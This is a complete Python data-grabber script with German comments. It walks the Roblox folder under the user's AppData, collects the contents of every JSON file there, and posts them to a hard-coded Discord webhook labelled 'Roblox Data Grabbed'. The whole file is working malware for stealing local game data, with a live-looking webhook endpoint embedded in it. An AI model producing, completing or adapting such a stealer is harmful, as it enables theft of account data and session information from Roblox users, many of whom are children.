import os
import requests
import json
import subprocess

# Pfad zur Roblox-Installationsdatei
roblox_path = os.path.expanduser("~\\AppData\\Local\\Roblox\\")

# Discord Webhook URL
webhook_url = "https://discord.com/api/webhooks/1479671641582866565/xGTuwsih38ivVwQaH9k6ROH0TYDDoKep6lvCWhzlR4CoveA8w1nQ_rDPaP88A3Ls7ZJG"

# Funktion zum Lesen von Roblox-Dateien
def read_roblox_files(path):
    data = {}
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith(".json"):
                file_path = os.path.join(root, file)
                with open(file_path, 'r', encoding='utf-8') as f:
                    try:
                        file_data = json.load(f)
                        data[file] = file_data
                    except json.JSONDecodeError:
                        continue
    return data

# Funktion zum Senden von Daten an den Discord-Webhook
def send_to_webhook(data):
    payload = {
        "content": "Roblox Data Grabbed",
        "embeds": [
            {
                "title": "Roblox Data",
                "description": json.dumps(data, indent=4),
                "color": 16711680
            }
        ]
    }
    requests.post(webhook_url, json=payload)

# Hauptfunktion
def main():
    roblox_data = read_roblox_files(roblox_path)
    send_to_webhook(roblox_data)

if __name__ == "__main__":
    main()
